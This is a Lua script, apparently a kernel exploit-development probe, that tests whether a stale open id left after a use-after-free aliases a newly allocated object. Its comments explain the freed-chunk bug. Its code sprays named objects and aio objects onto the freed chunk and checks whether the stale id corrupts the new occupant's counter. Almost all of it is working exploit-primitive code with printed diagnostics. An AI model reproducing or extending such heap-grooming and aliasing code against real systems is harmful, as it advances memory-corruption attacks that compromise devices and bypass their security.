-- CRASH_CLASS: HIGH
-- PROBE 831a: is the stale open id an alias onto the chunk's next occupant?
--
-- 550 (offset 0xC16270) does: lookup(table,id,0x120); destructor 0xC15DD0 sets
-- [obj+0x44] |= 0x1000 (the dead flag 555 tests as byte [+0x45] & 0x10) and
-- unlinks waiters; remove the id record 0x399e30; name unregister if [+0x45]&1;
-- dec [obj+0x54]; free. The open ids made by 551 have their own records, so they
-- keep pointing at that chunk after it is freed and reused.
--
-- Discriminator: create B with limit 0x100 and counter 0. If the stale id aliases
-- B, then 555(stale,0x80) writes 0x80 into B's counter (guard clear on a fresh
-- object), after which B's own 555(B,0x90) must fail (0x110 > 0x100). Without the
-- alias that call succeeds (0x90 <= 0x100).

print("=== PROBE 831a: stale open id as an alias ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function hx(v)
    if type(v) == "table" and v.h then
        return string.format("%08X%08X", to_num(v.h), to_num(v.l))
    end
    local n = to_num(v)
    if n < 0 then return string.format("-%X", -n) end
    return string.format("%X", n)
end
local function mkname(s)
    local p = memory.alloc(0x40)
    for i = 0, 0x3F do memory.write_byte(p + i, 0) end
    for i = 1, #s do memory.write_byte(p + i - 1, string.byte(s, i)) end
    return p
end
local function call(sc, ...)
    local a = {...}
    local ok, r = pcall(function() return sc(unpack(a)) end)
    return to_num(r or 0)
end

local sc549 = make_syscall(549)
local sc550 = make_syscall(550)
local sc551 = make_syscall(551)
local sc555 = make_syscall(555)
local sc669 = make_syscall(669)

-- control: B alone, no stale id anywhere near it
do
    local b = call(sc549, mkname("ctl1"), uint64(0x101), uint64(0), uint64(0x100))
    local r1 = call(sc555, uint64(b), uint64(0x90))
    print(string.format("[A] control B=%s  555(B,0x90)=%s (expect 0)", hx(b), hx(r1)))
    call(sc550, uint64(b))
end

-- test 1: free an object, then create a replacement with a different limit
do
    local n = mkname("als1")
    local a = call(sc549, n, uint64(0x101), uint64(0), uint64(0x110))
    local oa = call(sc551, n)
    print(string.format("[B] A=%s open=%s", hx(a), hx(oa)))
    print(string.format("[B] 550(A)=%s", hx(call(sc550, uint64(a)))))
    local b = call(sc549, mkname("ctl2"), uint64(0x101), uint64(0), uint64(0x100))
    print(string.format("[B] replacement B=%s (limit 0x100)", hx(b)))
    local w = call(sc555, uint64(oa), uint64(0x80))
    print(string.format("[B] 555(stale,0x80)=%s", hx(w)))
    local chk = call(sc555, uint64(b), uint64(0x90))
    print(string.format("[B] 555(B,0x90)=%s   -> -1 means the stale id wrote B's counter", hx(chk)))
    print(string.format("[B] 555(stale,1)=%s  555(B,1)=%s", hx(call(sc555, uint64(oa), uint64(1))), hx(call(sc555, uint64(b), uint64(1)))))
end

-- test 2: the same, but the bin is filled with aio objects (0x58) instead
do
    local n = mkname("als2")
    local a = call(sc549, n, uint64(0x101), uint64(0), uint64(0x110))
    local oa = call(sc551, n)
    print(string.format("[C] A=%s open=%s", hx(a), hx(oa)))
    print(string.format("[C] 550(A)=%s", hx(call(sc550, uint64(a)))))
    local data = memory.alloc(0x200)
    for i = 0, 0x1FF do memory.write_byte(data + i, 0x43) end
    local out = memory.alloc(0x40)
    for i = 1, 4 do
        local r = call(sc669, uint64(0x1001), uint64(to_num(data)), uint64(1), uint64(1), uint64(to_num(out)))
        if i == 1 then print(string.format("[C] aio create = %s", hx(r))) end
    end
    print(string.format("[C] 555(stale,1)=%s  (+0x80)=%s  (+0x1000)=%s",
        hx(call(sc555, uint64(oa), uint64(1))),
        hx(call(sc555, uint64(oa), uint64(0x80))),
        hx(call(sc555, uint64(oa), uint64(0x1000)))))
end

-- test 3: create many objects so one lands on the freed chunk, then bracket B's limit
do
    local n = mkname("als3")
    local a = call(sc549, n, uint64(0x101), uint64(0), uint64(0x110))
    local oa = call(sc551, n)
    print(string.format("[D] A=%s open=%s", hx(a), hx(oa)))
    print(string.format("[D] 550(A)=%s", hx(call(sc550, uint64(a)))))
    local made = {}
    for i = 1, 8 do
        made[i] = call(sc549, mkname("fillb" .. i), uint64(0x101), uint64(0), uint64(0x100))
        call(sc555, uint64(oa), uint64(0x80))
        local chk = call(sc555, uint64(made[i]), uint64(0x90))
        if chk ~= 0 then
            print(string.format("[D] create %d = %s  touched by the stale id (555=0x90 -> %s)", i, hx(made[i]), hx(chk)))
        end
    end
    print(string.format("[D] stale 555(+1)=%s", hx(call(sc555, uint64(oa), uint64(1)))))
end

print("[E] alive=true")
print("=== PROBE 831a COMPLETE ===")
